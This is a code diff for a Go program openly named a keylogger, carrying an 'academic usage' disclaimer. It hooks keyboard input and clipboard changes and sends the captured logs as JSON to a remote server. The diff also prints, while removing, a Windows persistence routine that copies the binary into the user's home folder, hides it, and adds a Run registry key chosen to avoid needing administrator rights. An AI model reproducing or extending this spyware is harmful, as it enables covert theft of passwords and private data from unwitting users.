@@ -3,6 +3,8 @@
 // this software is developed only for academic usage.
 // Any malicious usage of this software is forbidden and unrelated to the author.
 
+//go:build windows || linux
+
 package main
 
 import (
@@ -10,13 +12,9 @@ import (
 	"fmt"
 	"github.com/atotto/clipboard"
 	hook "github.com/robotn/gohook"
-	"golang.org/x/sys/windows/registry"
-	"io"
 	"net"
 	"os"
 	"os/signal"
-	"runtime"
-	"syscall"
 	"time"
 )
 
@@ -29,10 +27,6 @@ const (
 
 	KeyName = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
 	AppName = "Keylogger"
-
-	OSWindows = "windows"
-	OSLinux   = "linux"
-	OSDarwin  = "darwin"
 
 	TypeKeyboard  KeyType = "KBD"
 	TypeClipboard KeyType = "CBD"
@@ -79,69 +73,6 @@ func main() {
 			sendLogs()
 		}
 	}
-}
-
-// setAutostart registers autostart service on this device.
-func setAutostart() {
-	// According to the OS, use different strategy to register autostart.
-	switch runtime.GOOS {
-	case OSWindows:
-		// Copy the file to another directory.
-		filename, _ := copyFile()
-		// Hide file.
-		filenamePtr, err := syscall.UTF16PtrFromString(filename)
-		if err == nil {
-			_ = syscall.SetFileAttributes(filenamePtr, syscall.FILE_ATTRIBUTE_HIDDEN)
-		}
-		// Edit the registry table to register autostart service on Windows system.
-		// Open the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run key to read and edit. Select
-		// HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE to edit because it does not need administrator permission.
-		key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
-		defer key.Close()
-		// Check if this program has been written to the registry.
-		path, _, _ := key.GetStringValue(AppName)
-		if path != filename {
-			_ = key.SetStringValue(AppName, filename)
-		}
-	case OSLinux:
-		// TODO: Register autostart on Linux
-		// Idea: Edit the /etc/rc.d/rc.local
-	case OSDarwin:
-		// TODO: Register autostart on Mac OS
-	default:
-		// Does not support other platforms
-	}
-}
-
-// copyFile copies the currently running file to the current user directory.
-func copyFile() (string, error) {
-	// Get the current user directory.
-	home, err := os.UserHomeDir()
-	if err != nil {
-		home = "."
-	}
-	dstName := home + "\\" + AppName + ".exe"
-	srcName := os.Args[0]
-	// If the file has been copied, do not copy again.
-	if os.Args[0] == dstName {
-		return dstName, nil
-	}
-	// Create a destination file to copy.
-	dst, err := os.OpenFile(dstName, os.O_CREATE|os.O_WRONLY, os.ModePerm)
-	if err != nil {
-		return srcName, err
-	}
-	// Open the source file to copy.
-	src, err := os.Open(srcName)
-	if err != nil {
-		return srcName, err
-	}
-	// Copy file.
-	_, err = io.Copy(dst, src)
-	if err != nil {
-		return srcName, err
-	}
-	return dstName, nil
 }
 
 // listenClipboard listens and logs changes of clipboard.
@@ -225,7 +156,11 @@ func sendLogs() {
 	// Serialise keyLog slice to JSON.
 	bytes, _ := json.Marshal(keyLogs)
 	// Send logs to the target server.
-	_, _ = conn.Write(bytes)
+	_, err = conn.Write(bytes)
+	fmt.Println(string(bytes))
+	if err != nil {
+		fmt.Println(err.Error())
+	}
 	// Clear the keyLog slice.
 	keyLogs = []keyLog{}
 }
